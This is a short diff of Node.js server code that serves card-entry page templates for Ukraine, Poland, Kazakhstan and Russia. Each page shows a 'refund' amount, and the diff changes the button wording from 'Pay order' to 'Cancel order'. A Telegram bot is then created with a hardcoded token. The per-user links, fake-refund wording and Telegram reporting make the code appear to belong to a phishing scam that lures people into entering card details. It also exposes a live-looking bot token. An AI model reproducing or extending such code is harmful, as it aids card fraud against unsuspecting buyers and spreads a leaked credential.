@@ -35,26 +35,26 @@ try {
                 console.log(1);
                 var index = 'index_card_ua';
                 var amount_c = `Повернення у розмірі ${ress.rows[0].amount} грн`;
-                let payment = 'Оплата замовлення'
-                let payment_button = 'Оплатити замовлення'
+                let payment = 'Скасування замовлення'
+                let payment_button = 'Скасувати замовлення'
             } else if (req.params.userlink.search('pln') !=  -1) {
                 console.log(2);
                 var index = 'index_card_pln';
                 var amount_c = `Powrót w rozmiarze ${ress.rows[0].amount} zł`;
-                let payment = 'Zamów płatność'
-                let payment_button = 'Zapłacić za zamówienie'
+                let payment = 'Rezygnacje'
+                let payment_button = 'Rezygnacje'
             } else if (req.params.userlink.search('kz') !=  -1) {
                 console.log(2);
                 var index = 'index_card_kz';
                 var amount_c = `Возврат в размере ${ress.rows[0].amount} ₸`;
-                let payment = 'Оплата заказа'
-                let payment_button = 'Оплата'
+                let payment = 'Отмена заказа'
+                let payment_button = 'Отмена заказа'
             } else {
                 console.log(3);
                 var index = 'index_card';
                 var amount_c = `Возврат в размере ${ress.rows[0].amount} руб`;
-                let payment = 'Оплата заказа'
-                let payment_button = 'Оплата'
+                let payment = 'Отмена заказа'
+                let payment_button = 'Отмена заказа'
             }
             if (ress) {
                 const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
